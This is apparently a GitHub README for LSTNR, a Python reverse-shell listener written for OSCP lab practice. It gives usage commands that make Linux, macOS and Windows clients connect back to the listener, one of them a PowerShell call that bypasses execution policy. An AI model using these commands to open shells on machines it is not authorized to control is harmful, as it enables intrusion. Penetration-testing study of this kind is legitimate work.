# LSTNR
Python server that receives shell connections from remote devices. 

Remote devices can be managed from a Command Line Interface (CLI)

<img width="666" alt="Screenshot 2025-01-03 at 6 36 01 PM" src="https://github.com/user-attachments/assets/9f1a5adb-3981-42cb-9855-3d847ec16c53" />

# DISCLAIMER
This is only for testing purposes, not intended for anything illegal. I was testing out ways to manage multiple connections while doing the OSCP labs. #Hobbies

# Download LSTNR

```git clone github.com/bwithe/LSNTR```

# USAGE

1. Start LSTNR
    - `python3 lstnr.py -p <PORT_TO_LISTEN>`

2. Have CLIENT connect to LSTNR
    - Linux / MacOS
      - `bash client.sh -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`
      - `python3 client.py -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`
     
    - Windows
        - `powershell -ep bypass .\client.ps1 -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`

# Screenshot examples:
- Client connects to <LSTNR_SERVER>
<img width="702" alt="Screenshot 2025-01-04 at 10 49 03 PM" src="https://github.com/user-attachments/assets/c3027a17-1340-4f64-ac6c-776046003fd9" />

- LSTNR Server catches connection, and is able to manage remote device
<img width="722" alt="Screenshot 2025-01-04 at 10 48 47 PM" src="https://github.com/user-attachments/assets/4725cf8a-4ab0-47b7-9d36-acf0e5256f99" />
